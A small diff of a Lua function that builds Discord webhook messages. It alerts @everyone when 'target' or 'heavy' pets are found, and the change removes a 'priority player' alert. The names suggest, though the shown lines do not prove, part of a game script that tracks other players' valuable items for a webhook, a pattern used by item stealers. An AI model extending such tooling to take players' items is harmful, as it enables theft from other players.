@@ -425,8 +425,6 @@ function DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorit
     local content = ""
     if hasRare then
         content = "@everyone 🚨 TARGET PETS FOUND!\n"
-    elseif priorityPlayer then
-        content = ":crown: Priority player detected!\n"
     elseif hasHeavy then
         content = "@everyone 🚨 Heavy pets found!\n"
     end
